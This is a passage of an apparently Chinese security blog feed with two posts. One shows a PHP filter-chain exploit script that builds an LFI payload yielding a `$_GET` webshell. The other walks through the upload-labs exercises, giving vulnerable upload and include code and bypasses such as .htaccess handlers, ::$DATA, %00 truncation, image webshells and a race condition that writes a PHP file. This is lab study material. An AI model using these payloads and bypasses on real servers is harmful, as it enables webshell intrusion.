&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;,</span><br><span class=\"line\">    &#x27;z&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;,</span><br><span class=\"line\">    &#x27;U&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;,</span><br><span class=\"line\">    &#x27;P&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;,</span><br><span class=\"line\">    &#x27;V&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;,</span><br><span class=\"line\">    &#x27;0&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;,</span><br><span class=\"line\">    &#x27;Y&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;,</span><br><span class=\"line\">    &#x27;W&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;,</span><br><span class=\"line\">    &#x27;d&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;,</span><br><span class=\"line\">    &#x27;D&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;,</span><br><span class=\"line\">    &#x27;7&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;,</span><br><span class=\"line\">    &#x27;4&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\">$filters = &quot;convert.base64-encode|&quot;;</span><br><span class=\"line\"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span><br><span class=\"line\">$filters .= &quot;convert.iconv.UTF8.UTF7|&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">foreach (str_split(strrev($base64_payload)) as $c) &#123;</span><br><span class=\"line\">    $filters .= $conversions[$c] . &quot;|&quot;;</span><br><span class=\"line\">    $filters .= &quot;convert.base64-decode|&quot;;</span><br><span class=\"line\">    $filters .= &quot;convert.base64-encode|&quot;;</span><br><span class=\"line\">    $filters .= &quot;convert.iconv.UTF8.UTF7|&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$filters .= &quot;convert.base64-decode&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">$final_payload = &quot;php://filter/&#123;$filters&#125;/resource=data://,aaaaaaaaaaaaaaaaaaaa&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// echo $final_payload;</span><br><span class=\"line\">var_dump(file_get_contents($final_payload));</span><br><span class=\"line\"></span><br><span class=\"line\">// hexdump</span><br><span class=\"line\">// 00000000  73 74 72 69 6e 67 28 31  38 29 20 22 3c 3f 3d 60  |string(18) &quot;&lt;?=`|</span><br><span class=\"line\">// 00000010  24 5f 47 45 54 5b 30 5d  60 3b 3b 3f 3e 18 22 0a  |$_GET[0]`;;?&gt;.&quot;.|</span><br></pre></td></tr></table></figure>\n<p><code>convert.iconv.UTF8.UTF7</code>  将等号转换为字母。之所以使用这个的原因是 exp 作者遇到过有时候等号会让  <code>convert.base64-decode</code>  过滤器解析失败的情况，可以使用 iconv 从 UTF8 转换到 UTF7 ，会把字符串中的任何等号变成一些 base64 。</p>\n<p>我们可以知道对于这种方法来说，其实文件内容并不重要，但至少得有内容，而且一般读取有内容的文件并不是大问题，所以我们可以简单尝试利用  <code>/etc/passwd</code> :</p>\n<p>后面还有一些天书一样的解释，我实在…</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90dHRhbmcuY29tL2FyY2hpdmUvMTM5NS8=\">https://tttang.com/archive/1395/</span></p>\n<p>还有一种神仙解法，先挖坑～</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90dHRhbmcuY29tL2FyY2hpdmUvMTM4NC8=\">hxp CTF 2021 - A New Novel LFI - 跳跳糖 (tttang.com)</span></p>\n<p>实话实说，都是我做不出来的解法</p>\n<p>我也就做做 16 年的 ctf 罢了</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/04/16/Upload/",
            "url": "http://example.com/2022/04/16/Upload/",
            "title": "File upload",
            "date_published": "2022-04-16T05:38:45.000Z",
            "content_html": "<h1 id=\"upload\"><a class=\"markdownIt-Anchor\" href=\"#upload\">#</a> Upload</h1>\n<blockquote>\n<p>当用户点击上传按钮后，后台会对上传的文件进行判断 比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。 如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被 webshell。</p>\n<p>所以，在设计文件上传功能时，一定要对传进来的文件进行严格的安全考虑。比如：<br>\n–验证文件类型、后缀名、大小；<br>\n–验证文件的上传方式；<br>\n–对文件进行一定复杂的重命名；<br>\n–不要暴露文件上传后的路径；<br>\n–等等…</p>\n</blockquote>\n<h2 id=\"upload-labs\"><a class=\"markdownIt-Anchor\" href=\"#upload-labs\">#</a> upload-labs</h2>\n<p>Pass01</p>\n<p>文件上传时先上传到临时目录，在从临时目录移动到定义的文件夹</p>\n<p>C:\\Users\\18310\\AppData\\local\\temp  -&gt;  ./uploads/xxx.php</p>\n<p>上传结束，临时文件删除</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$is_upload = false;</span><br><span class=\"line\">$msg = null;</span><br><span class=\"line\">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class=\"line\">    if (file_exists(UPLOAD_PATH)) &#123; </span><br><span class=\"line\">        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];   //&#x27;upload_file&#x27;是数组，通过[]取值</span><br><span class=\"line\">        $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class=\"line\">        if (move_uploaded_file($temp_file, $img_path))&#123;</span><br><span class=\"line\">            $is_upload = true;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            $msg = &#x27;上传出错！&#x27;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class=\"line\">    function checkFile() &#123;</span><br><span class=\"line\">        var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value;</span><br><span class=\"line\">        if (file == null || file == &quot;&quot;) &#123;</span><br><span class=\"line\">            alert(&quot;请选择要上传的文件!&quot;);</span><br><span class=\"line\">            return false;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        //定义允许上传的文件类型</span><br><span class=\"line\">        var allow_ext = &quot;.jpg|.png|.gif&quot;;</span><br><span class=\"line\">        //提取上传文件的类型</span><br><span class=\"line\">        var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class=\"line\">        //判断上传文件类型是否允许上传</span><br><span class=\"line\">        if (allow_ext.indexOf(ext_name) == -1) &#123;</span><br><span class=\"line\">            var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class=\"line\">            alert(errMsg);</span><br><span class=\"line\">            return false;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>method 1. 抓包，上传后缀改为 jpg 的 php，抓包后修改后缀为 php</p>\n<p>method 2. 前端 JS 验证，浏览器关闭 js</p>\n</blockquote>\n<p>Pass02 检测 MIME</p>\n<p>BP 修改 Content-Type: image/jpeg（image/png，image/gif）</p>\n<p>利用 copy 和成木马图片</p>\n<p>copy xxxx.jpg /b + test.php /a test1.jpg</p>\n<p>Pass03</p>\n<p>通过上传 php3,php5,phtml 绕过</p>\n<p>上传 php3 需要在 Apache 配置文件中增加解析 php3,php5,phtml, 使 Apache 解析这些文件</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#<span class=\"title class_\">AddType</span> text/html .<span class=\"property\">shtml</span></span><br><span class=\"line\"><span class=\"title class_\">AddoutputFilter</span> <span class=\"variable constant_\">INCLUDES</span> .<span class=\"property\">shtml</span></span><br><span class=\"line\"><span class=\"title class_\">AddType</span> application/x-httpd-php .<span class=\"property\">php</span> .<span class=\"property\">phtml</span> .<span class=\"property\">php3</span></span><br></pre></td></tr></table></figure>\n<p>#asp 可以通过 asa 和 cer 绕过</p>\n<p>Pass04</p>\n<p>.htaccess 实现 php 伪静态</p>\n<p>.htaccess 文件夹内文件都会被当做 php 解析</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">SetHandler</span> application/x-httpd-php   <span class=\"comment\">//将目录下所有文件都作为php解析</span></span><br></pre></td></tr></table></figure>\n<p>或使用 Apache 解析漏洞</p>\n<p>test.php.x</p>\n<p>预防：使用以下代码使得上传后无法解析</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1641700272045-7fc11c94-5bb3-4087-a010-94cf9230bbf7.png\" alt=\"img\"></p>\n<p>Pass-04 过滤代码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = null;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (isset(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = array(<span class=\"string\">&quot;.php&quot;</span>,<span class=\"string\">&quot;.php5&quot;</span>,<span class=\"string\">&quot;.php4&quot;</span>,<span class=\"string\">&quot;.php3&quot;</span>,<span class=\"string\">&quot;.php2&quot;</span>,<span class=\"string\">&quot;.php1&quot;</span>,<span class=\"string\">&quot;.html&quot;</span>,<span class=\"string\">&quot;.htm&quot;</span>,<span class=\"string\">&quot;.phtml&quot;</span>,<span class=\"string\">&quot;.pht&quot;</span>,<span class=\"string\">&quot;.pHp&quot;</span>,<span class=\"string\">&quot;.pHp5&quot;</span>,<span class=\"string\">&quot;.pHp4&quot;</span>,<span class=\"string\">&quot;.pHp3&quot;</span>,<span class=\"string\">&quot;.pHp2&quot;</span>,<span class=\"string\">&quot;.pHp1&quot;</span>,<span class=\"string\">&quot;.Html&quot;</span>,<span class=\"string\">&quot;.Htm&quot;</span>,<span class=\"string\">&quot;.pHtml&quot;</span>,<span class=\"string\">&quot;.jsp&quot;</span>,<span class=\"string\">&quot;.jspa&quot;</span>,<span class=\"string\">&quot;.jspx&quot;</span>,<span class=\"string\">&quot;.jsw&quot;</span>,<span class=\"string\">&quot;.jsv&quot;</span>,<span class=\"string\">&quot;.jspf&quot;</span>,<span class=\"string\">&quot;.jtml&quot;</span>,<span class=\"string\">&quot;.jSp&quot;</span>,<span class=\"string\">&quot;.jSpx&quot;</span>,<span class=\"string\">&quot;.jSpa&quot;</span>,<span class=\"string\">&quot;.jSw&quot;</span>,<span class=\"string\">&quot;.jSv&quot;</span>,<span class=\"string\">&quot;.jSpf&quot;</span>,<span class=\"string\">&quot;.jHtml&quot;</span>,<span class=\"string\">&quot;.asp&quot;</span>,<span class=\"string\">&quot;.aspx&quot;</span>,<span class=\"string\">&quot;.asa&quot;</span>,<span class=\"string\">&quot;.asax&quot;</span>,<span class=\"string\">&quot;.ascx&quot;</span>,<span class=\"string\">&quot;.ashx&quot;</span>,<span class=\"string\">&quot;.asmx&quot;</span>,<span class=\"string\">&quot;.cer&quot;</span>,<span class=\"string\">&quot;.aSp&quot;</span>,<span class=\"string\">&quot;.aSpx&quot;</span>,<span class=\"string\">&quot;.aSa&quot;</span>,<span class=\"string\">&quot;.aSax&quot;</span>,<span class=\"string\">&quot;.aScx&quot;</span>,<span class=\"string\">&quot;.aShx&quot;</span>,<span class=\"string\">&quot;.aSmx&quot;</span>,<span class=\"string\">&quot;.cEr&quot;</span>,<span class=\"string\">&quot;.sWf&quot;</span>,<span class=\"string\">&quot;.swf&quot;</span>,<span class=\"string\">&quot;.ini&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = trim(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = deldot(<span class=\"variable\">$file_name</span>);//删除文件名末尾的点</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strrchr(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);//分割取后缀</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strtolower(<span class=\"variable\">$file_ext</span>); //转换为小写</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = str_ireplace(<span class=\"string\">&#x27;::$DATA&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);//去除字符串::<span class=\"variable\">$DATA</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = trim(<span class=\"variable\">$file_ext</span>); //收尾去空</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!in_array(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.<span class=\"variable\">$file_name</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>Pass05</p>\n<p>PhP 通过大小写绕过</p>\n<p>只在 Windows 下使用，因为 Windows 不区分大小写</p>\n<p>Pass06</p>\n<p>在提交时在文件末尾加空格绕过后缀检测，Windows 服务端会自动去除，但 php 可以识别空格</p>\n<p>通过抓包修改</p>\n<p>Pass07</p>\n<p>后缀加.，Windows 忽略文件后的.</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1641701454141-fc96f35c-12db-4bb3-a9b5-ccbc57e77c58.png\" alt=\"img\"></p>\n<p>Pass08</p>\n<p>当从 Windows shell 命令行指定创建文件时，流的完整名称为 “<strong>filename</strong>:<strong>stream name</strong>:<strong>stream type</strong>”，如示例中所示： “myfile.txt:stream1:$DATA”</p>\n<p>::<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mtext>数据流。默认数据流没有名称。对</mtext><mi>N</mi><mi>T</mi><mi>F</mi><mi>S</mi><mtext>格式下的一个文件而言，至少包含一个流，即</mtext><mi>d</mi><mi>a</mi><mi>t</mi><mi>a</mi><mtext>流（其</mtext><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>a</mi><mi>m</mi><mi>t</mi><mi>y</mi><mi>p</mi><mi>e</mi><mtext>为</mtext></mrow><annotation encoding=\"application/x-tex\">DATA  数据流。 默认数据流没有名称。对NTFS格式下的一个文件而言，至少包含一个流，即data流（其stream type为</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">A</span><span class=\"mord cjk_fallback\">数</span><span class=\"mord cjk_fallback\">据</span><span class=\"mord cjk_fallback\">流</span><span class=\"mord cjk_fallback\">。</span><span class=\"mord cjk_fallback\">默</span><span class=\"mord cjk_fallback\">认</span><span class=\"mord cjk_fallback\">数</span><span class=\"mord cjk_fallback\">据</span><span class=\"mord cjk_fallback\">流</span><span class=\"mord cjk_fallback\">没</span><span class=\"mord cjk_fallback\">有</span><span class=\"mord cjk_fallback\">名</span><span class=\"mord cjk_fallback\">称</span><span class=\"mord cjk_fallback\">。</span><span class=\"mord cjk_fallback\">对</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">N</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord cjk_fallback\">格</span><span class=\"mord cjk_fallback\">式</span><span class=\"mord cjk_fallback\">下</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">一</span><span class=\"mord cjk_fallback\">个</span><span class=\"mord cjk_fallback\">文</span><span class=\"mord cjk_fallback\">件</span><span class=\"mord cjk_fallback\">而</span><span class=\"mord cjk_fallback\">言</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">至</span><span class=\"mord cjk_fallback\">少</span><span class=\"mord cjk_fallback\">包</span><span class=\"mord cjk_fallback\">含</span><span class=\"mord cjk_fallback\">一</span><span class=\"mord cjk_fallback\">个</span><span class=\"mord cjk_fallback\">流</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">即</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">a</span><span class=\"mord cjk_fallback\">流</span><span class=\"mord cjk_fallback\">（</span><span class=\"mord cjk_fallback\">其</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">e</span><span class=\"mord cjk_fallback\">为</span></span></span></span> DATA），data 流是文件的主流，默认的 data 流其 stream name 为空。默认一个文件如果被指定了流，而该流没有 stream type 的话会在存储时自动添加 $DATA。</p>\n<p>在 window 的时候如果文件名 + <code>&quot;::$DATA&quot;</code>  会把 <code>::$DATA</code>  之后的数据当成文件流处理，不会检测后缀名，且保持 <code>::$DATA</code>  之前的文件名</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1641701582526-a5e593cd-a5a6-4472-8185-b8c142d207ae.png\" alt=\"img\"></p>\n<p>php 开发模式下 php -S localhost:9090           php 版本 &lt; 7</p>\n<p>localhost:9090/web.php.  会造成任意文件下载和源码读取</p>\n<p>localhost:9090/web.PHP  源码读取</p>\n<p>Pass09</p>\n<p><code>test.php. .   </code></p>\n<p><code>test.php. .     </code>   // 最后还有一个空格</p>\n<p>trim 两次，去 dot 一次，剩下一个点绕过</p>\n<p>Pass10</p>\n<p>后缀被替换为空</p>\n<p>teat.pphphp</p>\n<p>str_ireplace 可以连续过滤多次，比如 phpphp</p>\n<p>test11</p>\n<p>%00 截断 (get 截断) 文件可控</p>\n<p>PHP 底层用 c 语言，c 语言中 \\0 是结束符</p>\n<p>在 PHP 中 get 方法使用 %00 进行截断，而 get 是 url 传参，url 解码后，%00 就是 \\0</p>\n<p>截断后原本的文件名被截断导致随机数被丢失</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$img_path = $_GET[<span class=\"string\">&#x27;save_path&#x27;</span>].<span class=\"string\">&quot;/&quot;</span>.rand(<span class=\"number\">10</span>, <span class=\"number\">99</span>).date(<span class=\"string\">&quot;YmdHis&quot;</span>).<span class=\"string\">&quot;.&quot;</span>.$file_ext;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1641715548691-bb017a2c-3516-48af-ab83-13a2cf1828ca.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221025161153164.png\" alt=\"image-20221025161153164\"></p>\n<p>截断条件 PHP&lt;5.3.29 GPC 关闭</p>\n<p>php%00 截断</p>\n<p>1. 上传时路径可控，使用 00 截断</p>\n<p>2. 文件下载时，00 截断绕过白名单检查</p>\n<p>3. 文件包含时，00 截断后面限制 (主要是本地包含时)</p>\n<p>4. 其它与文件操作有关的地方都可能使用 00 截断。</p>\n<p>Pass12</p>\n<p>post 截断</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$img_path = $_POST[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1641716003160-187aa0eb-ac1d-4b9d-8250-dac1ac8499aa.png\" alt=\"img\"></p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1641715928171-812d6b71-ffa2-47ac-afab-5e5577c11eb3.png\" alt=\"img\"></p>\n<p>25 改为 00</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1641715981547-19efbd93-4201-4301-91e8-916dbca04d31.png\" alt=\"img\"></p>\n<p>或者将 %00urldecode</p>\n<p>Pass 13 文件包含</p>\n<p>只读前两个字节</p>\n<p>1. 上传图片码</p>\n<p>copy xxxx.jpg /b + test.php /a test1.jpg</p>\n<p>2. 文件包含，他写了一个 include.php 作为文件包含</p>\n<?php \n\ninclude demo.jpg\n\n?>\n<p>会将包含的文件当做 PHP 执行</p>\n<p>include 时文件不能可控</p>\n<p>127.0.0.1/include.php?file=./upload/1.jpg</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">/*</span><br><span class=\"line\">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span><br><span class=\"line\">*/</span><br><span class=\"line\">header(<span class=\"string\">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(isset(<span class=\"variable\">$file</span>))&#123;</span><br><span class=\"line\">    include <span class=\"variable\">$file</span>;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    show_source(__file__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>Pass14</p>\n<p>==Pass13</p>\n<p>Pass16</p>\n<p>重新生成文件导致木马无效</p>\n<p>通过 payload 将木马插入到没有被打乱的部分，实现木马</p>\n<p>png 和 jpg 都会有不被打乱的部分</p>\n<p>通过脚本找到没有被打乱的部分</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjY1NyN0b2MtMg==\">https://xz.aliyun.com/t/2657#toc-2</span></p>\n<p>Pass17</p>\n<p>时间竞争 文件先上传后判断，导致上传后出现，一旦出现资源占用时，rename 操作被中断，可以生成</p>\n<p>上传一下文件，通过 intruder 连续上传，web.php</p>\n<p><code>&lt;?php fputs(fopen('../haha.php','w'),'&lt;?php phpinfo(); ?&gt;');&gt;</code></p>\n<p>在访问 web.php，访问时抓包，送到 intruder，一旦访问到，则会在上级目录生成 haha.php</p>\n<p>解决：先判断，如果后缀不对别上传</p>\n<p>写到上级目录防止递归删除文件夹中全部内容，如果不是递归删除，生成在当前目录也行</p>\n<p>Pass19</p>\n<p><code>.</code>  截断</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NzMwNjU0Ny9hcnRpY2xlL2RldGFpbHMvMTIwMDQzMDMy\">https://blog.csdn.net/weixin_47306547/article/details/120043032</span></p>\n<h2 id=\"文件上传防御与绕过\"><a class=\"markdownIt-Anchor\" href=\"#文件上传防御与绕过\">#</a> 文件上传防御与绕过</h2>\n<blockquote>\n<p>前端验证</p>\n<p>白名单过滤后缀 